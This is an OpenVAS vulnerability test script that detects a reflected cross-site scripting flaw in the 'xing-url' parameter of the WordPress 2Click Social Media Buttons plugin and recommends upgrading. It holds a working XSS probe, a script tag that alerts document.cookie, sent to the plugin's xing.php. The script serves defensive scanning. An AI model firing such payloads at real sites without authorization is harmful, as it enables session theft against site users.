###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_socialmedia_buttons_plugin_xss_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# WordPress 2Click Social Media Buttons Plugin 'xing-url' Parameter XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802856");
  script_version("$Revision: 11857 $");
  script_bugtraq_id(53481);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-18 11:02:14 +0200 (Di, 18 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-05-17 10:23:01 +0530 (Thu, 17 May 2012)");
  script_name("WordPress 2Click Social Media Buttons Plugin 'xing-url' Parameter XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/49181/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75518");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/49181");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112615/wp2click-xss.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"WordPress 2-Click-Socialmedia-Buttons Plugin version 0.32.2 and prior");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user supplied input
  to the 'xing-url' parameter in
  '/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php', which
  allows attackers to execute arbitrary HTML and script code in a user's
  browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to 2-Click-Socialmedia-Buttons Plugin version 0.35 or later.");

  script_tag(name:"summary", value:"This host is running WordPress with 2Click Social Media Buttons
  plugin and is prone to cross site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/2-click-socialmedia-buttons/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?xing-url="><script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>", extra_check:"XING/Share")){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);